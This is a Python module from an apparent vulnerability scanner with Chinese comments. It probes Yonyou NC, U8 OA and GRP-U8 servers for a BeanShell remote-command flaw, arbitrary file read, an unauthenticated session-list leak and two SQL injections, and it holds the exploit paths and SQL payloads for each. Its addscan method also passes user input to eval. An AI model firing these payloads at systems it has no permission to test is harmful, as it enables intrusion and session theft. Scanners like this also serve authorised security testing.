#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Yonyou扫描类: 
        1. 用友NC BeanShell远程命令执行漏洞
            CNVD-2021-30167

        2. 用友ERP-NC NCFindWeb接口任意文件读取/下载/目录遍历
            暂无编号

        3. 用友U8 OA getSessionList.jsp 敏感信息泄漏
            暂无编号
                Payload: https://blog.csdn.net/qq_41617034/article/details/124268004

        4. 用友U8 OA test.jsp SQL注入
            暂无编号
                Payload: https://blog.csdn.net/qq_41617034/article/details/124268004

        5. 用友GRP-U8 Proxy SQL注入 
            CNNVD-201610-923
                Payload: https://blog.csdn.net/qq_41617034/article/details/124268004


'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

class Yonyou():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Yonyou'

        self.cnvd_2021_30167_payloads = [
            {
                'path': 'servlet/~ic/bsh.servlet.BshServlet',
                'data': ''
            }
        ]

        self.yonyou_nc_fileRead_payloads = [
            {
                'path': 'NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml',
                'data': ''
            }
        ]

        self.yonyou_u8_oa_getsession_payloads = [
            {
                'path': 'yyoa/ext/https/getSessionList.jsp?cmd=getAll',
                'data': ''
            },
            {
                'path': 'getSessionList.jsp?cmd=getAll',
                'data': ''
            }
        ]

        self.yonyou_u8_oa_test_sqlinject_payloads = [
            {
                'path': 'yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))',
                'data': ''
            },
            {
                'path': 'test.jsp?doType=101&S1=(SELECT%20MD5(1))',
                'data': ''
            }
        ]

        self.cnnvd_201610_923_payloads = [
            {
                'path': 'Proxy',
                'data': 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'
            },
            {
                'path': 'Proxy',
                'data': 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>'
            }
        ]

    def cnvd_2021_30167_scan(self, url):
        ''' 用友NC BeanShell远程命令执行漏洞
                给了一个命令执行的页面, 在框框内输入命令, 然后点击按钮就可以运行任意代码
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name + 'NC'
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CNVD-2021-30167'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cnvd_2021_30167_payloads:   # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if ('BeanShell' in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def yonyou_nc_fileRead_scan(self, url):
        ''' 用友ERP-NC NCFindWeb接口任意文件读取/下载漏洞
                也可以目录遍历
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name + 'ERP-NC'
        vul_info['vul_type'] = 'FileRead'
        vul_info['vul_id'] = 'NC-fileRead'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.yonyou_nc_fileRead_payloads:# * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('nc.bs.framework.server' in res.text) or ('WebApplicationStartupHook' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['vul_type'], vul_info['app_name'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def yonyou_u8_oa_getsession_scan(self, url):
        '''  通过该漏洞, 攻击者可以获取数据库中管理员的账户信息以及session, 可利用session登录相关账号 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name + 'U8-OA'
        vul_info['vul_type'] = 'DSinfo'
        vul_info['vul_id'] = 'Yonyou-u8-getSessionList-unAuth'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.yonyou_u8_oa_getsession_payloads:
            path = payload['path']
            target = url + path

            vul_info['path'] = path
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            session_re = r'([0-9A-Z]{32})+'
            if (re.search(session_re, res.text, re.M|re.U)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def yonyou_u8_oa_test_sqlinject_scan(self, url):
        ''' 由于与致远OA使用相同的文件, 于是存在同样的漏洞 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name + 'U8-OA'
        vul_info['vul_type'] = 'SQLinject'
        vul_info['vul_id'] = 'Yonyou-u8-test.jsp-sqlinject'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.yonyou_u8_oa_test_sqlinject_payloads:
            path = payload['path']
            target = url + path

            vul_info['path'] = path
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if ('c4ca4238a0b923820dcc509a6f75849b' in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def cnnvd_201610_923_scan(self, url):
        '''  
            用友GRP-u8存在XXE漏洞, 该漏洞源于应用程序解析XML输入时没有禁止外部实体的加载, 导致可加载外部SQL语句
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name + 'GRP-U8'
        vul_info['vul_type'] = 'SQLinject/RCE'
        vul_info['vul_id'] = 'CNNVD-201610-923'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cnnvd_201610_923_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            version_re = r'column[1-4]{1}="Microsoft SQL Server \d{1,5} -.*Copyright.*Microsoft Corporation.*"'

            if (re.search(version_re, res.text, re.I|re.M|re.S|re.U)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cnvd_2021_30167_scan, url=url),
            thread(target=self.yonyou_nc_fileRead_scan, url=url),
            thread(target=self.yonyou_u8_oa_getsession_scan, url=url),
            thread(target=self.yonyou_u8_oa_test_sqlinject_scan, url=url),
            thread(target=self.cnnvd_201610_923_scan, url=url)
        ]

yonyou = Yonyou()